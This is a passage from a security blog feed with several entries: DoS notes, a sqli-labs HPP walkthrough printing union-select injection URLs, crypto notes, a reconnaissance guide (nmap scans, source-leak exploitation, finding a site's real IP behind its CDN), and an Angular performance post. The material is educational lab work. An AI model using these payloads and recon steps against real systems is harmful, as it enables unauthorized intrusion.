<h2 id="Week-11-Denial-of-Service-Attack"><a href="#Week-11-Denial-of-Service-Attack" class="headerlink" title="Week 11: Denial of Service Attack"></a>Week 11: Denial of Service Attack</h2><h3 id="Goals"><a href="#Goals" class="headerlink" title="Goals"></a>Goals</h3><ul>
<li><p>Target on availability</p>
<ul>
<li>take out a large site with little computing work</li>
</ul>
</li>
<li><p>How: amplification</p>
<ul>
<li>a small number of packets =&gt; big effect</li>
</ul>
</li>
<li><p>DoS bug -&gt; design flaw</p>
</li>
<li><p>DoS flood -&gt; command bot-net to generate a flood of requests</p>
</li>
</ul>
<h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><ul>
<li>Client puzzles<ul>
<li>given challenges</li>
<li>for TCP connection floods, the first data must contain a puzzle solution, otherwise, the TCP connection is closed.</li>
<li>for SSL hanshake DoS<ul>
<li>Challenge C based on TLS session ID</li>
<li>Server: check puzzle solution before RSA decryption</li>
</ul>
</li>
<li><strong>Limitations</strong><ul>
<li>Requires changes to both clients and servers</li>
<li>Hurts low-power legitimate clients during an attack</li>
</ul>
</li>
</ul>
</li>
<li>CAPTCHAs</li>
<li>Source identification<ul>
<li>identify packet source</li>
<li>block the attack at the source</li>
<li>Ingress filtering<ul>
<li>ISP only forwards packets with legitimate source IP</li>
</ul>
</li>
</ul>
</li>
<li>Traceback<ul>
<li>DDoS involves many packets on same path</li>
<li>Store one link in each packet</li>
</ul>
</li>
</ul>
<h3 id="Countermeasures-2"><a href="#Countermeasures-2" class="headerlink" title="Countermeasures"></a>Countermeasures</h3><ul>
<li><p>Prevent initial hack</p>
</li>
<li><p>Use of firewalls</p>
</li>
<li><p>Check ingress/egress packets</p>
</li>
<li><p>Use a server farm and load balancer to offset the effects of a DDoS attack</p>
</li>
<li><p>Change the IP address of the attacked system</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Network Security</category>
      </categories>
      <tags>
        <tag>Network Security</tag>
      </tags>
  </entry>
  <entry>
    <title>HPP参数污染攻击(sqli labs 29-31关)</title>
    <url>/2021/07/10/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/</url>
    <content><![CDATA[<h1 id="HPP参数污染攻击"><a href="#HPP参数污染攻击" class="headerlink" title="HPP参数污染攻击"></a>HPP参数污染攻击</h1><h2 id="什么是HPP参数污染"><a href="#什么是HPP参数污染" class="headerlink" title="什么是HPP参数污染"></a>什么是HPP参数污染</h2><p><code>HPP</code>是(Http Parameter Pollution)的简称。简单来说，有AB两台服务器，你访问的网站实际上是先通过A服务器进行数据过滤处理然后A将过滤好的数据传给B服务器，B再传给A，最后A传给你。所以过程是：<code>User-&gt;A-&gt;B-&gt;A-&gt;User</code> 因此，A在当中充当着<code>WAF</code>的角色。 若想绕过A对参数的过滤，我们可以尝试直接请求B，因为A最终也是要请求B才能获得数据的。</p>
<span id="more"></span>

<p>那么我们可以利用不同服务器类型解析处理参数位置的不同来完成攻击，这就是HPP。</p>
<p><img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710101238806.png" alt="image-20210710101238806"></p>
<p>假设A服务器是<code>JSP/Tomcat</code>,B服务器是<code>PHP/Apache</code>。当我们访问网站<code>www.example.com/index.php?id=1&amp;id=1</code>的时候，通过上图可知，A服务器是<code>JSP/Tomcat</code>，只接收第一个参数，而B服务器是<code>PHP/Apache</code>,接收最后一个参数。所以我们可以构造：<code>www.example.com/index.php?id=1&amp;id=-2 order by 3--+</code></p>
<h2 id="sqli-labs-第29关"><a href="#sqli-labs-第29关" class="headerlink" title="sqli labs 第29关"></a>sqli labs 第29关</h2><p><img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710104023467.png" alt="image-20210710104023467"></p>
<p>当我们尝试注入时：</p>
<p><img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710104057030.png" alt="image-20210710104057030"></p>
<p>被拦截。</p>
<p>查看源码：<img src="/image/HPP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%E6%94%BB%E5%87%BB-sqli-labs-29-31%E5%85%B3/image-20210710104152453.png" alt="image-20210710104152453"></p>
<p>我们可以看到参数被检测了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">String rex = <span class="string">&quot;^\\d+$&quot;</span>;<span class="comment">//正整数</span></span><br><span class="line">Boolean <span class="keyword">match</span>=id.<span class="title function_ invoke__">matches</span>(rex);</span><br></pre></td></tr></table></figure>

<p>那么我们可以通过<code>HPP参数污染</code>绕过这个<code>WAF</code>，观察发现<code>PHP</code>代码是没有任何过滤的，我们构造代码：</p>
<p><code>http://192.168.120.128:8080/sqli-labs/Less-29/?id=1&amp;id=-1&#39; union select 1,2,3--+</code></p>
<p>接下来就可以继续注入了。</p>
<h2 id="sqli-labs-第30关"><a href="#sqli-labs-第30关" class="headerlink" title="sqli labs 第30关"></a>sqli labs 第30关</h2><p>和29关相同，只是<strong>id</strong>加了<strong>引号</strong></p>
<p>构造代码：</p>
<p><code>http://192.168.120.128:8080/sqli-labs/Less-30/?id=1&amp;id=-1&quot; union select 1,2,3--+</code></p>
<h2 id="sqli-labs-第31关"><a href="#sqli-labs-第31关" class="headerlink" title="sqli labs 第31关"></a>sqli labs 第31关</h2><p>同上，id加了(“”)</p>
<p>构造代码：</p>
<p><code>http://192.168.120.128:8080/sqli-labs/Less-31/?id=1&amp;id=-1&quot;) union select 1,2,3--+</code></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HPP参数污染攻击的应用还有很多很多，之后还需学习</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Sqlilabs</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>SQL Injection</tag>
        <tag>SQLilab</tag>
      </tags>
  </entry>
  <entry>
    <title>Hash, Mac, and Digital Signature</title>
    <url>/2022/06/14/Hash-Mac-and-Digital-Signature/</url>
    <content><![CDATA[<h1 id="Hash-functions"><a href="#Hash-functions" class="headerlink" title="Hash functions"></a>Hash functions</h1><ul>
<li>One-way security<ul>
<li>h= H(m), knowing H(m) but should still be hard to find h(input)</li>
</ul>
</li>
<li>COL: collision-resistance security<ul>
<li>computationally infeasible to find any pair of distinct messages m1, m2 such that <code>h1=H(m1)</code> is equal to <code>h2=H(m2)</code></li>
<li>Find collision using <strong>≈√(2^n )=2^(n/2)</strong> random inputs to H</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h1 id="Message-Authentication-Code-MAC"><a href="#Message-Authentication-Code-MAC" class="headerlink" title="Message Authentication Code(MAC)"></a>Message Authentication Code(MAC)</h1><ul>
<li><p>MAC is fast, and it has similar building blocks as symmetric key encryption.</p>
</li>
<li><p>is a many-to-one function</p>
<ul>
<li>many messages generate the same MAC</li>
</ul>
</li>
<li><p>Both Sender and Reciever can send MAC since they both have the same secret key.</p>
</li>
</ul>
<h2 id="CMAC"><a href="#CMAC" class="headerlink" title="CMAC"></a>CMAC</h2><p>CMAC is a CBC mode for authentication, and it will use the final block as a MAC.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/20220614130709.png" alt="CMAC"></p>
<h2 id="HMAC"><a href="#HMAC" class="headerlink" title="HMAC"></a>HMAC</h2><p>A MAC based on a hash function.</p>
<p>HMAC(K,M)= Hash[<code>(K+ XOR opad) </code>|| <code>Hash[(K+ XOR ipad) || M)]</code> ]</p>
<h1 id="Digital-signatures"><a href="#Digital-signatures" class="headerlink" title="Digital signatures"></a>Digital signatures</h1><p>The digital signature is slow.</p>
<p><strong>Properties</strong></p>
<ul>
<li>Verifies author<ul>
<li>UNForgebale</li>
<li>Undeniable - non-repudiatable</li>
</ul>
</li>
<li>universally verifiable</li>
</ul>
<h2 id="Problems-why-use-it"><a href="#Problems-why-use-it" class="headerlink" title="Problems - why use it?"></a>Problems - why use it?</h2><p>There’s a significant risk that Alice cannot authenticate Bob. In other words, another person Peter can pretend to be Bob, and send his public key to Alice, and then Alice will generate a shared key using Peter’s public key. In this case, Peter would decrypt the messages that Alice sends to Bob.</p>
<p>This is the so-called <strong>Man in the middle attack</strong>.</p>
<p>Thus, cryptographist were trying to find a more secure way.</p>
<blockquote>
<p><strong>Digital signature</strong> is used for proving authenticity of the origin of documents as well as for non-repudiation as it can prove the authenticity of the signer.</p>
<p>Another use of digital signature is to ensure the integrity of the messages against unauthorized modification</p>
</blockquote>
<h2 id="Generate-digital-signatures"><a href="#Generate-digital-signatures" class="headerlink" title="Generate digital signatures"></a>Generate digital signatures</h2><p>![digital signatures](<a href="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/digital">https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/digital</a> signature.png)</p>
<p><strong>Generate digital signatures using RSA</strong></p>
<p>Encrypting the hashed message using the private key:</p>
<p><code>s = m^d (mod n)</code></p>
<p>Decrypting the hashed message using the public key:</p>
<p><code>m = s^e (mod n)</code></p>
<h2 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h2><blockquote>
<p><strong>Attack capability</strong>: attacker knows signer’s public key pk</p>
<p><strong>Chosen-message attacks(CMA)</strong></p>
<ul>
<li>should be unforgeable even if the attacker can see many valid signatures on many messages, even messages chosen by the attacker.</li>
</ul>
<p>Attack goal:</p>
<ul>
<li>Existential UnForgeability <strong>(EUF):</strong><ul>
<li>Should be infeasible for an attacker to produce <strong>any</strong> valid (msg, sig) pair where msg <strong>has not been signed by the honest signer</strong> (even for randomly looking msg)</li>
</ul>
</li>
</ul>
</blockquote>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>Monash Uni FIT2093</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全之信息收集</title>
    <url>/2021/05/30/Information-Gathering/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Information Gathering is to gather different kinds of information against the targeted victim or system - Websites, servers, etc.</p>
<h2 id="Identify-Operation-System"><a href="#Identify-Operation-System" class="headerlink" title="Identify Operation System"></a>Identify Operation System</h2><span id="more"></span>

<h3 id="通过网站文件大小写来识别"><a href="#通过网站文件大小写来识别" class="headerlink" title="通过网站文件大小写来识别"></a>通过网站文件大小写来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Linux对大小写敏感，windows不敏感 - 比如index.html -&gt; index.Html</span><br><span class="line">若网页不能正常显示，则为Linux系统；若能正常显示，则为windows系统</span><br></pre></td></tr></table></figure>

<h3 id="通过ping的TTL值来识别"><a href="#通过ping的TTL值来识别" class="headerlink" title="通过ping的TTL值来识别"></a>通过ping的TTL值来识别</h3><p><br />TTL值可作为参考，其依然有可能被修改 </p>
<pre><code><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">WINDOWS</span> <span class="number">98</span> TTL:<span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">LINUX</span> <span class="number">2</span>.<span class="number">2</span>X/<span class="number">2</span>.<span class="number">4</span>X TTL:<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">WINDOWS</span> NT/<span class="number">2000</span>/XP TTL:<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">UNIX</span>/BSD TTL:<span class="number">255</span></span><br></pre></td></tr></table></figure>
</code></pre>
<p><strong>例如以我本地电脑MAC(Linux)为例，ttl为64，所以可判断为linux</strong></p>
<p><img src="/image/information-Gathering/1-2530916.png" alt="1"></p>
<h3 id="通过组合对应来识别"><a href="#通过组合对应来识别" class="headerlink" title="通过组合对应来识别"></a>通过组合对应来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ASP和ASP.NET(aspx) -&gt; windows</span><br><span class="line">aspx mssql windows iis</span><br><span class="line">php mysql windows/linux apache</span><br><span class="line">jsp mssql/oracle windows/linux tomcat</span><br><span class="line">javaee mysql/oracle/ windows/linux weblogic/jboos/tomcat</span><br></pre></td></tr></table></figure>
<h3 id="通过抓包来识别"><a href="#通过抓包来识别" class="headerlink" title="通过抓包来识别"></a>通过抓包来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">在==header==中可看到server信息</span><br></pre></td></tr></table></figure>

<p>例如：某游戏网站，可判断其为windows, aspx类</p>
<p><img src="/image/information-Gathering/image-20210601160243421.png" alt="image-20210601160243421"></p>
<h3 id="通过端口扫描来识别（包括nmap绕过防火墙）"><a href="#通过端口扫描来识别（包括nmap绕过防火墙）" class="headerlink" title="通过端口扫描来识别（包括nmap绕过防火墙）"></a>通过端口扫描来识别（包括nmap绕过防火墙）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">可以通过扫描端口来判断数据库类型 - 可使用masscan或nmap来扫描</span><br><span class="line">nmap中文手册：http://www.nmap.com.cn/doc/manual.shtm</span><br><span class="line">nmap www.example.com</span><br><span class="line">nmap -O -A www.example.com</span><br><span class="line">nmap -Pn -O -A www.example.com</span><br><span class="line">扫网段： nmap 47.94.236.0/24</span><br><span class="line">如果开了防火墙:用nmap会提示Host seems down</span><br><span class="line">绕过防火墙：nmap -Pn 127.0.0.1</span><br></pre></td></tr></table></figure>

<h3 id="通过网站文件类型来识别"><a href="#通过网站文件类型来识别" class="headerlink" title="通过网站文件类型来识别"></a>通过网站文件类型来识别</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">如 index.jsp, index.aspx, index.php, index.action, index.asp</span><br><span class="line">另外，压缩包文件：</span><br><span class="line">Windows -&gt; zip, rar</span><br><span class="line">linux -&gt; tar.gz</span><br></pre></td></tr></table></figure>

<h2 id="Get-Relative-Sites-Information"><a href="#Get-Relative-Sites-Information" class="headerlink" title="Get Relative Sites Information"></a>Get Relative Sites Information</h2><h3 id="获取子域名网站"><a href="#获取子域名网站" class="headerlink" title="获取子域名网站"></a>获取子域名网站</h3><p>可利用子域名查询平台或者工具进行获取</p>
<p>推荐： oneforall  下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
<h3 id="获取不同端口"><a href="#获取不同端口" class="headerlink" title="获取不同端口"></a>获取不同端口</h3><p>不同端口可能有不同的网站，增加attack的几率</p>
<p>推荐：nmap, masscan</p>
<h2 id="Get-Source-Code-of-Taget-Sites"><a href="#Get-Source-Code-of-Taget-Sites" class="headerlink" title="Get Source Code of Taget Sites"></a>Get Source Code of Taget Sites</h2><h3 id="获取当前网站的CMS版本信息"><a href="#获取当前网站的CMS版本信息" class="headerlink" title="获取当前网站的CMS版本信息"></a>获取当前网站的CMS版本信息</h3><ul>
<li><p>使用在线平台查询（RECOMMAND）</p>
<p>国外：<a href="https://whatcms.org/">https://whatcms.org/</a> -&gt; 适用于国外的CMS</p>
<p>国内：<a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a> -&gt; 适用于国内的CMS</p>
</li>
<li><p>使用工具查询</p>
<p>工具：<a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> -&gt;线下比赛没有网络环境</p>
</li>
<li><p>使用 Github 监控</p>
<p><a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a> 申请-配置-写入-测试</p>
</li>
<li><p>通过关键字/文件名/url配合搜索引擎查询</p>
</li>
</ul>
<h3 id="获取网站源码"><a href="#获取网站源码" class="headerlink" title="获取网站源码"></a>获取网站源码</h3><p><strong>一般来说获取某些小型站点（套用模版或者第三方程序）的网站源码是有可能的。</strong></p>
<p><a href="https://www.secpulse.com/archives/124398.html">More Information About Source Code leakage</a></p>
<h4 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title="git源码泄漏"></a>git源码泄漏</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www.example.com/.git/</span><br><span class="line">存在即可用==githack==利用漏洞</span><br></pre></td></tr></table></figure>

<h4 id="svn源码泄漏"><a href="#svn源码泄漏" class="headerlink" title="svn源码泄漏"></a>svn源码泄漏</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www.example.com/.svn/</span><br><span class="line">存在即可用==svn工具==利用漏洞</span><br></pre></td></tr></table></figure>

<h4 id="WEB-INF泄露"><a href="#WEB-INF泄露" class="headerlink" title="WEB-INF泄露"></a>WEB-INF泄露</h4><blockquote>
<p>WEB-INF 主要包含一下文件或目录：</p>
<p>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</p>
<p>WEB-INF/database.properties : 数据库配置文件</p>
<p>WEB-INF/classes/ : 一般用来存放Java类文件(.class)</p>
<p>WEB-INF/lib/ : 用来存放打包好的库(.jar)</p>
<p>WEB-INF/src/ : 用来放源代码(.asp和.php等)</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">若存在WEB-INF/web.xml文件，且有file access权限，可以在web-inf/web.xml中看到暴露的java class路径。</span><br><span class="line">比如在web.xml中有cn.abc.servlet.DownloadServlet.class,如果有下载漏洞，你可以直接下载web inf/classes/cn/abc/servlet/DownloadServlet.class</span><br><span class="line"></span><br><span class="line">如 upload_file = ../../xxx.png</span><br><span class="line">即可访问 upload_file = web inf/classes/cn/abc/servlet/DownloadServlet.class</span><br><span class="line">并得到class文件 -&gt; 拖入idea查看即可</span><br></pre></td></tr></table></figure>

<h4 id="cvs泄露"><a href="#cvs泄露" class="headerlink" title="cvs泄露"></a>cvs泄露</h4><p>网站中存在.cvsignore</p>
<h4 id="GitHub源码泄漏"><a href="#GitHub源码泄漏" class="headerlink" title="GitHub源码泄漏"></a>GitHub源码泄漏</h4><p>一个利用思路是，可以在网站中寻找一些联系方式的信息，比如qq,wx,phone或者email，然后在github中搜索，可能能找到源码</p>
<h2 id="WAF-amp-CDN-amp-Real-IP-Address"><a href="#WAF-amp-CDN-amp-Real-IP-Address" class="headerlink" title="WAF &amp; CDN &amp; Real IP Address"></a>WAF &amp; CDN &amp; Real IP Address</h2><h3 id="判断WAF类型"><a href="#判断WAF类型" class="headerlink" title="判断WAF类型"></a>判断WAF类型</h3><p>Web Application Firewall简称WAF，WAF经常会拦截到我们的渗透攻击，所以需要判断WAF类型以便之后绕过它</p>
<ul>
<li><p>直接用工具判断：</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>
</li>
<li><p>根据拦截的页面判断</p>
<p>参考资料：<a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p>
</li>
</ul>
<h3 id="CDN绕过并查询真实服务器地址"><a href="#CDN绕过并查询真实服务器地址" class="headerlink" title="CDN绕过并查询真实服务器地址"></a>CDN绕过并查询真实服务器地址</h3><p>CDN：A Content Delivery Network， 本质上是用来加速，根据地理位置不同分配不同的服务器让用户能体验到最好的访问效果，同时也会对hacking有影响–因为隐藏了真实的ip地址</p>
<p><strong>判断是否有CDN:</strong></p>
<p>通过网站在线ping，看全国（全球）各地得到的ip是否相同，若不同则说明有CDN</p>
<p>推荐查询平台：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://www.17ce.com/ </span><br><span class="line"></span><br><span class="line">http://ping.chinaz.com</span><br><span class="line"></span><br><span class="line">https://www.wepcc.com/</span><br><span class="line"></span><br><span class="line">https://get-site-ip.com/</span><br></pre></td></tr></table></figure>

<p><strong>获取真实IP地址</strong></p>
<p>Ps： 如果不确定哪个是真实IP 可以查询IP地址 如果是cdn节点会显示 或者根据公司在的地址判断机房位置</p>
<ol>
<li><p>同服务器下的子域名可能不会做cdn</p>
</li>
<li><p>去掉www可能没做cdn</p>
</li>
<li><p>邮件服务器，若邮件服务器是搭建在网站服务器上的，那么可以通过注册账号密码 -&gt; 服务器会给你发送注册信息 -&gt; 显示邮件全文 -&gt; 找到ip</p>
<p>例如在gmail中：<img src="/image/information-Gathering/image-20210601164900369.png" alt="image-20210601164900369"></p>
<p>可以得到发送邮件的IP地址</p>
</li>
<li><p>证书查询/根据网站备案号</p>
</li>
<li><p>历史域名解析：过去可能未使用CDN，可以查到真实IP</p>
<p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
</li>
<li><p>工具查询cdn：fuck CDN</p>
<p><a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p>
<p><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p>
</li>
<li><p>APP抓包：若网站有相应APP，可以抓包APP来分析</p>
</li>
<li><p>国外访问（针对有些国家地区没有设置cdn）</p>
</li>
<li><p>接口查询 超级ping</p>
</li>
</ol>
<h2 id="Black-amp-White-Search-Engines"><a href="#Black-amp-White-Search-Engines" class="headerlink" title="Black&amp;White Search Engines"></a>Black&amp;White Search Engines</h2><p>推荐网站：</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">https://fofa.so/</span><br><span class="line"></span><br><span class="line">https://www.shodan.io/</span><br><span class="line"></span><br><span class="line">https://www.zoomeye.org/</span><br><span class="line"></span><br><span class="line">https://quake.360.cn/quake/<span class="params">#</span>/index</span><br></pre></td></tr></table></figure>

<h2 id="ARL-Asset-Reconnaissance-Lighthouse"><a href="#ARL-Asset-Reconnaissance-Lighthouse" class="headerlink" title="ARL(Asset Reconnaissance Lighthouse)"></a>ARL(Asset Reconnaissance Lighthouse)</h2><p>配合fofa可以有效完成信息收集，详见<a href="https://leihehehe.github.io/2021/06/01/arlSetup/">Web安全之ARL灯塔搭建与使用</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Information Gathering</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Information Gathering</tag>
      </tags>
  </entry>
  <entry>
    <title>How Did I Improve My Angular Project&#39;s Loading Speed?</title>
    <url>/2023/04/28/How-Did-I-Improve-My-Angular-Project-s-Loading-Speed/</url>
    <content><![CDATA[<h1 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h1><p><a href="http://official.urls.fit/">My URL Shortener project</a> has been deployed by Kubernetes for high availability but it seems to be not perfectly “high availability” because of the low loading speed(you could even see the plain text without any style applied when you first open up the website).</p>
<p>I was trying to solve this problem by checking all <code>CSS</code> files, images, even to get rid of them, but that still did not work.</p>
<p>Another serious problem is that the pipeline ran very slowly, needing like almost 10 minutes to finish building and upload a docker image.</p>
<h1 id="Reasons"><a href="#Reasons" class="headerlink" title="Reasons"></a>Reasons</h1><ul>
<li><p>Used <code>express.js</code> to run the angular application. </p>
</li>
<li><p>Ran <code>npm i</code> and <code>npm build</code> in a docker container.</p>
</li>
<li><p><code>npm build</code> is not good for a production-level website</p>
</li>
<li><p>No resources cache was used for the website.</p>
</li>
</ul>
<h1 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h1><ul>
<li><p>Change <code>npm run build</code> to <code>npm run build --configuration=production -aot</code></p>
<ul>
<li><blockquote>
<p><strong>–configuration=production</strong> is typically optimized for production environments with features like minification and tree shaking enabled.</p>
</blockquote>
</li>
<li><blockquote>
<p><strong>–aot</strong> enables Ahead-of-Time (AOT) compilation. AOT compilation pre-compiles the Angular templates during the build process, resulting in faster rendering and reduced bundle size compared to Just-in-Time (JIT) compilation.</p>
</blockquote>
</li>
</ul>
</li>
<li><p>Do not run <code>npm install; npm run build</code> in <code>Dockerfile</code>, instead, all the commands to build the <code>Angular</code> application should be executed in a pipeline. Then resources will need to be copied to <code>Nginx</code> in the docker container using <code>Dockerfile</code>.</p>
</li>
<li><p>Instead of using <code>express.js</code>, use <code>Nginx</code> to handle the static resources.</p>
</li>
<li><p>Nginx <strong>Gzip</strong> compression</p>
</li>
</ul>
<p>Nginx <code>deafult.conf</code> : This change should be applied to both the Angular container and the Kubernetes node because I used Nginx to handle different API requests.</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">listen</span>  [::]:<span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  /var/log/nginx/host.access.log  main;</span></span><br><span class="line">    <span class="attribute">gzip</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">    <span class="attribute">gzip_disable</span>      <span class="string">&quot;MSIE [1-6]\.&quot;</span>;</span><br><span class="line">    <span class="attribute">gzip_min_length</span>   <span class="number">1100</span>;</span><br><span class="line">    <span class="attribute">gzip_vary</span>         <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">gzip_proxied</span>      expired <span class="literal">no</span>-cache <span class="literal">no</span>-store private auth;</span><br><span class="line">    <span class="attribute">gzip_types</span> text/plain application/json application/x-javascript application/javascript application/css application/xml application/xml+rss text/javascript application/x-httpd-php image/jpeg image/gif image/png image/x-ms-bmp;</span><br><span class="line">    <span class="attribute">gzip_comp_level</span>   <span class="number">6</span>;</span><br><span class="line">    <span class="section">location</span> / &#123; </span><br><span class="line">        <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">    <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span>   /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><h2 id="Website-Loading-Speed"><a href="#Website-Loading-Speed" class="headerlink" title="Website Loading Speed"></a>Website Loading Speed</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202304281714275.png"></p>
<p>To fully load all the resources when first visiting the website, around <code>8 sec</code> is needed. This is a highly optimized result compared to the previous time(<code>over 15 sec</code>).</p>
<h2 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h2><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202304281557490.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/202304281557118.png"></p>
<h1 id="Improvements"><a href="#Improvements" class="headerlink" title="Improvements"></a>Improvements</h1><p>There are still some issues that need to be fixed</p>
<ul>
<li><p>The loading speed can be improved further - based on the code itself.</p>
</li>
<li><p>Trying to use <code>Lazy Loading</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Development</category>
        <category>Angular</category>
      </categories>
      <tags>
        <tag>URL shortener</tag>
        <tag>Angular Project</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞之JAVA RMI原理、流程(2)</title>
    <url>/2021/07/25/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJAVA-RMI%E5%8E%9F%E7%90%86%E3%80%81%E6%B5%81%E7%A8%8B-2/</url>
    <content><![CDATA[<h1 id="什么是JAVA-RMI"><a href="#什么是JAVA-RMI" class="headerlink" title="什么是JAVA RMI"></a>什么是JAVA RMI</h1><blockquote>
<p>RMI ( Remote Method Invocation , 远程方法调用 ) 能够让在某个 Java虚拟机 上的对象像调用本地对象一样调用另一个Java虚拟机 中的对象上的方法 , 这两个 Java虚拟机 可以是运行在同一台计算机上的不同进程, 也可以是运行在网络中不同的计算机上</p>
</blockquote>
<h1 id="为什么要使用RMI？"><a href="#为什么要使用RMI？" class="headerlink" title="为什么要使用RMI？"></a>为什么要使用RMI？</h1><ul>
<li><p>一般我们想要在本地调用一个<code>object</code>的方法的时候，会采用<code>object.method()</code>的方式来调用，但如果提供<code>object</code>的并不是本地的<code>JAVA</code>虚拟机，而是远程的<code>JAVA</code>虚拟机呢？我们本地并没有这个对象，那么我们就需要用到<strong>RMI</strong>。<span id="more"></span></p>
</li>
<li><p>当我们<strong>服务器</strong>拥有一系列服务，想要把它们提供给<strong>客户端</strong>，但问题是，服务器只想提供它想要提供给客户端的方法，它不可能把自己所有的对象和方法都发送给客户端，让客户端去调用一个对象的所有方法，这是极其不安全的。</p>
</li>
<li><p>假设<strong>客户端(JVMA)<strong>想要获取</strong>服务端(JVMB)<strong>上的某个对象<code>ObjectA</code>，但下次程序修改后，实例对象的名称可能会发生改变，这时候</strong>客户端（JVMA）</strong>并不知道实例对象的名称是什么，也就无法获取到了，又失去了与服务端(JVMB)的联系。</p>
</li>
